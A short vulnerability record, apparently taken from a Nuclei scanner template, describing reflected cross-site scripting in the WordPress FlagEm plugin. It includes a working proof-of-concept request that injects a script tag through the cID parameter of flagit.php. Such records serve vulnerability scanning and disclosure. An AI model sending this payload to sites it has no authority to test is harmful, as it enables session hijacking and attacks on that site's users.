# Vulnerability: WordPress FlagEm - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-flagem-xss.yaml`)

## Description
WordPress FlagEm plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

